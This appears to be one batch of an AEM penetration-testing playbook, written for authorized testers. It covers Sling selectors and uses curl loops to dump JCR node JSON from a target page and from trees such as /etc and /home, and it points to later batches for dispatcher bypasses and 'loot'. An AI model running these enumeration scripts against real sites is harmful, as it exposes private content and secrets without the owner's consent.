# Batch 02 — Sling URL idea + JSON node dumps

## objective

Understand the “extra dots” in AEM URLs just enough to use them, then try **DefaultGETServlet-style** dumps: `.1.json`, `.2.json`, `.3.json` (and maybe `.infinity.json`).

## estimated_time

60–90 minutes

## prerequisites

- Batch 01 done (`T`, `PAGE` saved)
- Still authorized

## testing_workflow

### 1) 2-minute mental model (read only)

```text
/content/page.list.html/extra
 \__path__/ \sel/ \ext/ \suffix/

Selectors = cheat codes between name and extension
.json dumps = "print this folder as data"
```

You only need: **path + selector + extension**.

### 2) Technique A — shallow dumps on your page

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

for ext in 1.json 2.json 3.json tidy.json; do
  echo "=== ${PAGE}.${ext} ==="
  curl -sk -o /tmp/n.json -w "code=%{http_code} size=%{size_download}\n" \
    "$T${PAGE}.${ext}"
  head -c 250 /tmp/n.json; echo; echo
done
```

### 3) Technique B — top-level trees (same idea, bigger folders)

```bash
for p in /content /content/dam /etc /home /conf; do
  echo "===== $p.1.json ====="
  curl -sk -o /tmp/n.json -w "code=%{http_code} size=%{size_download}\n" \
    "$T${p}.1.json"
  head -c 200 /tmp/n.json; echo
done
```

### 4) Technique C — deep dump (one shot only)

```bash
# Can be huge or blocked — one try
curl -sk -o /tmp/inf.json -w "infinity:%{http_code} size=%{size_download}\n" \
  --max-time 30 "$T${PAGE}.infinity.json"
head -c 300 /tmp/inf.json; echo
```

### 5) Record what worked

```text
Working dump URL examples:
- ...
Blocked:
- ...
Interesting node names seen:
- ...
```

## decision_points

| If… | Then… |
|-----|--------|
| Any `.N.json` returns real JCR JSON | Great surface — continue **03**, also plan **07/08** for loot |
| All JSON 404 | Normal (dispatcher) — continue **03** then **04–06** bypasses |
| JSON shows secrets already | Note finding; still finish this batch, loot properly in 07–08 |
| Only HTML 200, never JSON | Continue 03–06; JSON may need bypass |

## expected_findings

- Information disclosure via node JSON
- Map of top-level folders (`/content`, `/etc`, …)
- Proof dispatcher allows or blocks DefaultGETServlet

## next_batch_to_continue_with

→ **[03-querybuilder-direct.md](./03-querybuilder-direct.md)**
